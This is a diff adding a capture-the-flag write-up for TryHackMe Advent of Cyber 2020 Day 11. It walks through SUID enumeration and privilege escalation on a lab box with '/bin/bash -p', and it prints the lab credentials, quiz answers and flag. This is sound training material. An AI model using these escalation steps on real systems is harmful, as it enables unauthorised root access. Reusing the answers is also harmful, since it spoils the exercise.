@@ -16,7 +16,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] [Day 8 - What's Under the Christmas Tree?](#day-8-whats-under-the-christmas-tree)
 - [x] [Day 9 - Anyone can be Santa!](#day-9-anyone-can-be-santa)
 - [x] [Day 10 - Don't be Elfish!](#day-10-dont-be-elfish)
-- [ ] Day 11 - The Rogue Gnome
+- [x] [Day 11 - The Rogue Gnome](#day-11-the-rogue-gnome)
 - [ ] Day 12 - Ready, set, elf.
 - [ ] Day 13 - Coal for Christmas
 - [ ] Day 14 - Where's Rudolph?
@@ -818,3 +818,94 @@ smb: \> ls
 ```
 
 There is nothing else for us to look at. This is also the end of this challenge.
+
+## Day 11: The Rogue Gnome
+
+*Category: Networking*
+*Tags: Privilege Escalation, Linux*
+
+> We've got initial access, but now what? Learn some of the common linux privilege escalation techniques used to gain permissions to things that we shouldn't...
+
+IP: `10.10.43.93`
+
+### Basic Questions
+
+#### What type of privilege escalation involves using a user account to execute commands as an administrator?
+
+`vertical`
+
+#### What is the name of the file that contains a list of users who are a part of the sudo group?
+
+`sudoers`
+
+### Connecting via SSH
+
+For this challenge, we assume we have found a vulnerability to get a shell on the box. We can simulate this using an SSH connection with the credentials: `cmnatic:aoc2020`.
+
+```
+ssh cmnatic@10.10.43.93
+```
+
+After connecting, we are greated with a bash shell:
+
+```
+Last login: Fri Dec 11 18:17:18 2020 from 10.6.23.34
+-bash-4.4$ whoami
+cmnatic
+```
+
+### Privilege Escalation
+
+Unfortunately (and unsurprisingly), the account we are given doesn't have root privileges.  
+
+As suggested by THM, we can probably find a SUID binary to exploit. We can look for them by running:
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+And we get the following output (note: I have ommited all of the snap files):
+
+```
+-bash-4.4$ find / -perm -u=s -type f 2>/dev/null
+/bin/umount
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/bash
+/bin/ping
+/usr/bin/newgidmap
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/pkexec
+/usr/bin/newuidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+```
+
+OMG, `/bin/bash` is a SUID binary?!?! Ok, this looks really easy! I check out the [GTFObins](https://gtfobins.github.io/gtfobins/bash/) entry for bash and find out how to run it using SUID. Turns out all I need to type is `/bin/bash -p`. I run that command and boom, I have a shell as root!
+
+```
+bash-4.4# whoami
+root
+```
+
+### Getting the flag
+
+Now that I am root, getting the flag is very straight forward. All we need to do is `cat` the flag!
+
+```
+cat /root/flag.txt
+```
+
+Flag: `thm{2fb10afe933296592}`
